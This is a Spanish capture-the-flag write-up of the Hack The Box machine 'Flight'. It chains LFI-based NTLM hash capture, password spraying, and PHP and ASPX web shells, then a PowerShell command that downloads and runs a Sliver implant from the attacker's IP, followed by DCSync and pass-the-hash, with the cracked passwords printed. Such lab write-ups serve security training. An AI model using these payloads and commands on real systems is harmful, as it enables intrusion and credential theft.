---
tags:
  - type/writeup
  - asset/active-directory
  - env/windows
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/510
dificultad: Dificil
ip: 10.10.11.187
os: Windows
relacionados:
---
# HackTheBox - Flight

## Reconocimiento

### Escaneo Inicial

Para comenzar, realicé un escaneo de puertos completo con **Nmap** para identificar los servicios activos en la máquina. La gran cantidad de puertos abiertos, característicos de un entorno Windows, me sugirió que podría estar ante un Controlador de Dominio.

Bash

```
ports=$(nmap -p- --min-rate=1000 -T4 10.129.42.88 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.42.88
```

El escaneo reveló un servidor Apache en el puerto 80 y el nombre de host `flight.htb`. Inmediatamente, añadí esta entrada a mi archivo `/etc/hosts` para facilitar el acceso.

Bash

```
echo "10.129.42.88 flight.htb" | sudo tee -a /etc/hosts
```

> [!warning] Diferencia Horaria
> 
> Noté una diferencia horaria de 7 horas con la máquina. Esto es crucial recordarlo, ya que los protocolos de autenticación como Kerberos son sensibles al tiempo y requerirán que sincronice mi reloj más adelante.

### Enumeración Web y LFI

Al visitar `http://flight.htb`, encontré una página web estática sin funcionalidades aparentes. Sospechando la existencia de otros sitios web en el mismo servidor, utilicé **ffuf** para buscar hosts virtuales (Vhosts) y descubrí `school.flight.htb`.

Bash

```
ffuf -u "http://flight.htb" -H "Host: FUZZ.flight.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -t 50 -fs 229
```

Después de añadir el nuevo host a mi archivo `/etc/hosts`, navegué a `http://school.flight.htb`.

Bash

```
echo "10.129.42.88 school.flight.htb" | sudo tee -a /etc/hosts
```

Observé que la navegación del sitio utilizaba un parámetro `?view=` en `index.php` para cargar diferentes páginas, como `?view=about.html`. Esta estructura es un indicador clásico de una posible vulnerabilidad de **Inclusión Local de Archivos (LFI)**.

Mi primer intento de leer un archivo del sistema, como `C:\Windows\System32\drivers\etc\hosts`, falló, probablemente debido a un filtro que bloqueaba el uso de la barra invertida (`\`).

`http://school.flight.htb/index.php?view=C:\Windows\System32\drivers\etc\hosts`

Afortunadamente, en sistemas Windows, la barra diagonal (`/`) a menudo funciona como un separador de directorios alternativo. Modifiqué mi payload para usarla y logré evadir el filtro, confirmando la vulnerabilidad de LFI.

`http://school.flight.htb/index.php?view=C:/Windows/System32/drivers/etc/hosts`

---

## Explotación de vulnerabilidades

### Captura de Hash NTLM vía LFI

Con el LFI confirmado, mi siguiente paso fue intentar capturar credenciales. Pude hacerlo aprovechando que la vulnerabilidad permitía incluir rutas **UNC (Universal Naming Convention)**. Al solicitar un recurso desde una ruta UNC (ej. `\\attacker-ip\share`), el servidor Windows intenta autenticarse en mi máquina para acceder a ese recurso compartido.

Configuré **Responder** en mi máquina para escuchar las solicitudes de autenticación entrantes.

Bash

```
sudo responder -I tun0 -v
```

Luego, envié el siguiente payload a través del navegador, apuntando a un recurso inexistente en mi IP:

`http://school.flight.htb/index.php?view=//10.10.14.59/htb`

Inmediatamente, Responder capturó un hash NTLMv2 para el usuario `svc_apache`, la cuenta de servicio que ejecutaba el servidor web.

Utilicé **John the Ripper** para crackear el hash capturado con el diccionario `rockyou.txt`.

Bash

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
# Cracked Password: S@Ss!K@*t13
```

Obtuve la contraseña en texto plano: `S@Ss!K@*t13`.

### Movimiento Lateral: Password Spraying

Con las credenciales de `svc_apache`, verifiqué el acceso a los recursos compartidos SMB, pero no encontré permisos de escritura.

Bash

```
smbmap -H flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13'
```

Decidí enumerar otros usuarios del dominio utilizando `impacket-lookupsid`.

Bash

```
impacket-lookupsid svc_apache:'S@Ss!K@*t13'@'flight.htb'
```

Esto me proporcionó una lista de usuarios válidos. La hipótesis era que la contraseña de la cuenta de servicio `svc_apache` podría haber sido **reutilizada** por otro usuario. Para probar esto, realicé un ataque de **password spraying** con **CrackMapExec**, probando la misma contraseña (`S@Ss!K@*t13`) contra la lista de usuarios que había descubierto.

Bash

```
# Primero, guardé los nombres de usuario en un archivo llamado 'users'
crackmapexec smb flight.htb -u ./users -p 'S@Ss!K@*t13'
```

El ataque fue exitoso, revelando que el usuario `S.Moon` usaba la misma contraseña.

### Captura de Hash NTLMv2 vía SMB

Revisé los permisos de `S.Moon` en los recursos SMB y descubrí que tenía **permiso de escritura** en la carpeta `Shared`.

Bash

```
smbmap -H flight.htb -u 'S.Moon' -p 'S@Ss!K@*t13'
```

Aunque la carpeta estaba vacía, su nombre sugería que era accedida por múltiples usuarios. Mi estrategia fue plantar un archivo malicioso que, al ser visualizado por otro usuario, forzaría a su máquina a autenticarse contra mi equipo, permitiéndome capturar su hash NTLMv2.

Para ello, usé la herramienta **ntlm_theft**, que genera varios tipos de archivos trampa.

Bash

```
# Inicié Responder de nuevo
sudo responder -I tun0 -v

# Generé los archivos maliciosos
git clone https://github.com/Greenwolf/ntlm_theft
cd ./ntlm_theft
python3 ntlm_theft.py --generate all --server 10.10.14.67 --filename htb
```

Tras intentar subir varios de los archivos generados que se activan con solo navegar por la carpeta (`BROWSE TO FOLDER`), descubrí que solo se permitían archivos con extensión `.ini`. Subí `desktop.ini` y `autorun.inf` (renombrado a `autorun.ini`) al recurso `Shared`. Poco después, Responder capturó el hash NTLMv2 del usuario `c.bum`.

Nuevamente, usé **John the Ripper** para crackear el hash.

Bash

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
# Cracked Password: Tikkycoll_431012284
```

Obtuve la contraseña `Tikkycoll_431012284` para el usuario `c.bum`.

### Acceso Inicial: Shell Reversa

Con las nuevas credenciales, verifiqué los permisos SMB y encontré que `c.bum` tenía **permisos de escritura** en el recurso `Web`, que correspondía a la raíz de los sitios web `flight.htb` y `school.flight.htb`.

Bash

```
smbmap -H flight.htb -u 'c.bum' -p 'Tikkycoll_431012284'
```

Esto me permitió subir una web shell simple en PHP para obtener ejecución remota de comandos (RCE).

PHP

```
<?php echo system($_GET['c']); ?>
```

> [!note] Persistencia
> 
> Los archivos en el servidor web se eliminaban periódicamente, por lo que tuve que volver a subir la web shell varias veces durante el proceso.

Para obtener una shell más estable e interactiva, y evadir posibles detecciones de antivirus, decidí usar un C2 como **Sliver**. Generé un implante y configuré un listener `mtls`.

Bash

```
# En el servidor Sliver
sliver
generate --os windows --arch 64bit --mtls 10.10.14.67 --reconnect 60 --save htb.exe
mtls
```

Luego, levanté un servidor web en Python para alojar el implante y usé la web shell para descargarlo y ejecutarlo en la máquina víctima.

Bash

```
# En mi máquina local
sudo python3 -m http.server 80

# Comando ejecutado a través de la web shell (URL-encoded)
curl 'http://flight.htb/shell.php?c=powershell%20-c%20%22wget%2010.10.14.67%2Fhtb.exe%20-usebasicparsing%20-outfile%20C%3A%5Cusers%5Cpublic%5Cmusic%5Chtb.exe%3B%20C%3A%5Cusers%5Cpublic%5Cmusic%5Chtb.exe'
```

Recibí una sesión de Sliver como el usuario `svc_apache`. Como mi objetivo era operar como `c.bum`, utilicé la herramienta `RunasCs.exe` para ejecutar mi implante nuevamente, pero esta vez bajo el contexto del usuario `c.bum`, obteniendo una nueva sesión con sus privilegios.

Bash

```
# En la sesión de Sliver
upload /opt/RunasCs.exe
shell
.\RunasCs.exe c.bum Tikkycoll_431012284 -l 2 "C:\users\public\music\htb.exe"
```

---

## Escalada de privilegios

### Pivote Interno y Abuso de Cuenta Virtual

Dentro de la sesión de `c.bum`, descubrí que pertenecía al grupo `WebDevs` y que existía un servidor **IIS** escuchando en el puerto `8000` localmente (`localhost`). Para acceder a este servicio interno, creé un túnel **SOCKS5** con Sliver.

Bash

```
# En el servidor Sliver
socks5 start
```

Configuré FoxyProxy en mi navegador para enrutar el tráfico a través de este túnel y accedí a `http://127.0.0.1:8000`. Descubrí un sitio web de desarrollo alojado en `C:\inetpub\development`. Como miembro de `WebDevs`, tenía permisos de escritura en este directorio.

Subí una web shell ASPX para obtener ejecución de comandos en el contexto del servidor IIS.

Fragmento de código

```
<%@Page Language="C#"%><%var p=new System.Diagnostics.Process{StartInfo={FileName=Request["c"],UseShellExecute=false,RedirectStandardOutput=true}};p.Start();%><%=p.StandardOutput.ReadToEnd()%>
```

Usando la web shell ASPX, ejecuté mi implante de Sliver una vez más.

`http://127.0.0.1:8000/shell.aspx?c=C:\users\public\music\htb.exe`

Recibí una nueva sesión de Sliver, esta vez como `iis apppool\defaultapppool`. Este no es un usuario común, sino una **Cuenta Virtual de Microsoft**. Estas cuentas, cuando acceden a recursos de red, se autentican utilizando las credenciales de la **cuenta de la máquina** (en este caso, `FLIGHT$`).

### DCSync con Rubeus

Tener el control de la cuenta de la máquina (`FLIGHT$`) es extremadamente poderoso en un dominio. Me permite solicitar un **Ticket Granting Ticket (TGT)** de Kerberos para la propia cuenta de la máquina.

Utilicé el módulo de **Rubeus** integrado en Sliver (`armory`) para solicitar este ticket.

Bash

```
armory install rubeus
rubeus tgtdeleg /nowrap
```

Rubeus me devolvió el ticket TGT en formato base64. Con este ticket, podía realizar un ataque **DCSync**, que abusa de los privilegios de replicación de Directorio Activo para solicitar los hashes de contraseña de cualquier usuario, incluido el Administrador del dominio.

Para usar el ticket con herramientas de `impacket`, primero lo convertí de base64 a formato `kirbi` y luego a `ccache`.

> [!IMPORTANT] Sincronización de Reloj
> 
> Antes de realizar el ataque, sincronicé el reloj de mi máquina con el del Controlador de Dominio, un requisito indispensable para la autenticación Kerberos.

Bash

```
cat ticket.b64 | base64 -d > ticket.kirbi
kirbi2ccache ticket.kirbi ticket.ccache
sudo ntpdate -u flight.htb
```

Finalmente, utilicé `impacket-secretsdump` con el ticket `ccache` para ejecutar el ataque DCSync y obtener el hash NTLM del usuario Administrador.

Bash

```
KRB5CCNAME=ticket.ccache impacket-secretsdump -k -no-pass flight.htb -just-dc-user Administrator -target-ip 10.129.42.88
```

Con el hash del Administrador, obtuve una shell en el sistema como administrador utilizando `impacket-psexec`.

Bash

```
impacket-psexec Administrator@flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c
```

Una vez dentro, pude leer la bandera de `root.txt`.

### Anexo - Escalada Alternativa (Potato)

La cuenta virtual `IIS APPPOOL\DefaultAppPool` posee el privilegio `SeImpersonatePrivilege`. Este privilegio puede ser abusado con exploits de la familia "Potato" (Juicy Potato, Sweet Potato, etc.). El ataque consiste en forzar a un servicio de alto privilegio (como `NT AUTHORITY\SYSTEM`) a autenticarse contra un proceso que controlo. Gracias a `SeImpersonatePrivilege`, puedo "robar" ese token de autenticación y generar un nuevo proceso como `SYSTEM`.

Hubiera podido usar una herramienta como **SweetPotato.exe** para obtener una shell de `SYSTEM` directamente desde mi sesión de `IIS APPPOOL\DefaultAppPool`.

Bash

```
# En la sesión de Sliver
upload /opt/SweetPotato.exe
shell
.\SweetPotato.exe -e EfsRpc -p "C:\users\public\music\htb.exe"
```

Esto me habría proporcionado una sesión de Sliver como `NT AUTHORITY\SYSTEM` de forma más directa.

---

### Vulnerabilidades y Conceptos Clave

- **Local File Inclusion (LFI):** Explotación de la inclusión de archivos para leer ficheros locales y forzar la autenticación SMB a través de rutas UNC.
    
- **Captura de Hashes NTLM/NTLMv2:** Uso de herramientas como Responder para interceptar intentos de autenticación SMB y capturar hashes de contraseña.
    
- **Password Spraying:** Técnica que consiste en probar una única contraseña (generalmente común o comprometida) contra una lista de múltiples usuarios.
    
- **Abuso de Cuentas Virtuales (IIS AppPool):** Explotación del hecho de que las cuentas de servicio virtuales se autentican en la red como la cuenta de la máquina, permitiendo ataques basados en Kerberos.
    
- **Ataque DCSync:** Abuso de privilegios de replicación de Directorio Activo (obtenidos a través de la cuenta de la máquina) para extraer hashes de contraseña del Controlador de Dominio.
    
- **Kerberos (TGT Delegation):** Solicitud de un Ticket Granting Ticket para la cuenta de la máquina para su posterior uso en ataques de autenticación.
    
- **Abuso de Privilegios (SeImpersonatePrivilege):** Uso de privilegios de suplantación para escalar a `NT AUTHORITY\SYSTEM` mediante técnicas como los exploits "Potato".

## Bandera(s)

> [!flag] `flag{user}`
^bandera-user

> [!flag] `flag{root}`
^bandera-root
